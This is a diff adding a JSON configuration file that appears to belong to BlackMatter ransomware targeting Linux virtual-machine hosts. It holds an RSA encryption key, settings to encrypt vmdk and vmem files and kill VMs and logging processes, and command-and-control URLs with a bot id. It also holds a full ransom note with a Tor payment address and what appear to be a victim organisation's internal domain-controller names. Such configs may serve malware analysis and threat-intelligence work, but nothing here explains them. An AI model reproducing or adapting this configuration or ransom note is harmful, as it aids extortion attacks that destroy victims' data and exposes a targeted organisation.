@@ -1,0 +1,52 @@
+{
+    "rsa": "MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEA5uyveIuEmAkom7Z2ygCPkrm9tJa+4QWJxPhaRwR5oMJZGOEikHe\/i7YvOp5YQRjer99FM1lXmVgWYGnt\/ysDZImFvLEzK7OLmeAx\/hO\/bwOEKql4lyL\/iJcyix0Z5anP2SS54czEhSnN7UgDv\/0yDArE7jqt\/yk5TSyE4Zs7K+khw\/x1\/BElB5PvRKkNLw1SLSnleOTy+wOVoArFjzlcjk4vJ0V37ErC\/XGHkl057YQmNgFjcIk8fopqcvX+D39LsYRg62CAZZjQNBzs1OiJz9xYdysMXd1n9oz8QMflZRbr7cMXY2NX4MNAMMDSd2GgZqf0+bRsk3wNgqIT9926WvJOziltbLlSkH1xVFFL7eVjSU8mg4l9d4VW95DIp1ehucwbdEVvCzS8focAW7\/2mWlR5n8GH0cOc\/0XVB7Mm70BcMWKV3rUCzWLRtEoPBAk\/y9eQhgN7Koyo5h3KD56lehlnHmf0Ie5xAVWmZnvFMW5LgJZdGrUZcqchvpTRAmpZoJBCRyXyBXAOLyTpZQiAY96Ql+XeUL729CkJE8McRn1BSTPfKEewKvjiVS+QlwTatlb5yV3t1cfTxsXgtzH4IXs9z9RhkdWMpAixOPT58hHwcdpIC2ETr4tXqyFJgjqQh7jUkwFryg2ifc\/Pa6lbJlhJeDV3qQPqsQDrwh0890CAQM=",
+    "remove-self": "true",
+    "worker-concurrency": "0",
+    "disk": {
+        "enable": "true",
+        "type": "single",
+        "dark-size": "512",
+        "white-size": "30720",
+        "min-size": "0",
+        "extension-list": "vmdk,vmem,vswp,log"
+    },
+    "log": {
+        "enable": "true",
+        "level": "info",
+        "path": "\/tmp\/main.log"
+    },
+    "message": {
+        "enable": "true",
+        "file-name": "ReadMe.txt",
+        "file-content": "      ~+                                       \n               *       +\n         '     BLACK        |\n     ()    .-.,='``'=.    - o -         \n           '=\/_       \\     |           \n        *   |  '=._    |                \n             \\     `=.\/`,        '    \n          .   '=.__.=' `='      *\n +             Matter        +\n      O      *        '       .\n\n>>> What happens?\n   Your linux hosts are encrypted, and currently not operational. \n   We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data.\n   \n>>> What guarantees? \n   We are not a politically motivated group and we do not need anything other than your money. \n   If you pay, we will provide you the programs for decryption and we will delete your data. \n   If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. \n   We always keep our promises.\n\n>> How to contact with us? \n   1. Download and install TOR Browser (https:\/\/www.torproject.org\/).\n   2. Open http:\/\/supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion\/LH2WLI60XU9O283RYADWV\n\n>> Warning! Recovery recommendations.  \n   Do not DELETE or MODIFY any files, it can lead to recovery problems!"
+    },
+    "landing": {
+        "enable": "true",
+        "bot-id": "b0e039b42ef6c19c2189651c9f6c390e",
+        "key": "e2c8e7120397b549de02a0282f6a3353",
+        "urls": [
+            "http:\/\/mojobiden.com",
+            "http:\/\/nowautomation.com"
+        ]
+    },
+    "kill-vm": {
+        "enable": "true",
+        "ignore-list": [
+            "VMware vCenter",
+            "VMware-VirtualSAN-Witness",
+            "mfldc01.mflgroup.local",
+            "mfldc02.mflgroup.local",
+            "MFLDC1.MFLGROUP.local",
+            "MFLDC2.MFLGROUP.local",
+            "MFLDC05.MFLGROUP.local",
+            "mfldc04.mflgroup.local",
+            "mfldc03.mflgroup.local"
+        ]
+    },
+    "kill-process": {
+        "enable": "true",
+        "list": [
+            "vmsyslogd"
+        ]
+    }
+}
